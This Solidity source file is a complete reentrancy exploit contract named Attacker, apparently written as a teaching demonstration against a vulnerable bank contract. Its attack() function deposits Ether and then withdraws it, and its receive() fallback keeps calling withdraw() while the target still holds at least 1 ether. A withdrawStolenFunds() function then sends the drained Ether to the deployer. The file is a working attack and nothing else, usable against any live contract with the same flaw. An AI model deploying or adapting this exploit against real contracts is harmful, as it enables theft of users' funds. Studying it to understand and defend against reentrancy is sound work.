// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker
/// @author Agustin Acosta
/// @notice Exploit contract demonstrating reentrancy attacks on vulnerable bank contracts.
/// @dev Exploits the execution flow by calling withdraw() recursively in the receive() fallback.
contract Attacker {
    // ═══════════════════════════════════════════════════════════════════════
    // STORAGE
    // ═══════════════════════════════════════════════════════════════════════

    /// @notice Target bank contract address.
    address public immutable targetBank;

    /// @notice Owner of the attacker contract who can withdraw stolen funds.
    address public immutable owner;

    // ═══════════════════════════════════════════════════════════════════════
    // CUSTOM ERRORS
    // ═══════════════════════════════════════════════════════════════════════

    /// @notice Reverted when the constructor target address is the zero address.
    error ZeroAddress();

    /// @notice Reverted when the attack execution deposit is below the required minimum.
    error DepositTooLow();

    /// @notice Reverted when an account other than the owner tries to withdraw stolen funds.
    error Unauthorized();

    /// @notice Reverted when transferring stolen Ether to the owner fails.
    error TransferFailed();

    // ═══════════════════════════════════════════════════════════════════════
    // CONSTRUCTOR
    // ═══════════════════════════════════════════════════════════════════════

    /// @notice Initializes the attacker contract with the target bank.
    /// @param _targetBank The address of the target bank contract.
    constructor(address _targetBank) {
        if (_targetBank == address(0)) {
            revert ZeroAddress();
        }
        targetBank = _targetBank;
        owner = msg.sender;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WRITE FUNCTIONS
    // ═══════════════════════════════════════════════════════════════════════

    /// @notice Initiates the reentrancy attack by depositing and immediately withdrawing.
    /// @dev Requires at least 1 Ether deposit to trigger the callback loop.
    function attack() external payable {
        if (msg.value < 1 ether) {
            revert DepositTooLow();
        }
        IBank(targetBank).deposit{value: msg.value}();
        IBank(targetBank).withdraw();
    }

    /// @notice Fallback function invoked by the bank during Ether transfer.
    /// @dev Triggers the recursive withdraw call if the bank still holds balance.
    receive() external payable {
        if (targetBank.balance >= 1 ether) {
            IBank(targetBank).withdraw();
        }
    }

    /// @notice Withdraws all stolen Ether accumulated in this contract to the owner.
    function withdrawStolenFunds() external {
        if (msg.sender != owner) {
            revert Unauthorized();
        }
        (bool success, ) = owner.call{value: address(this).balance}("");
        if (!success) {
            revert TransferFailed();
        }
    }
}
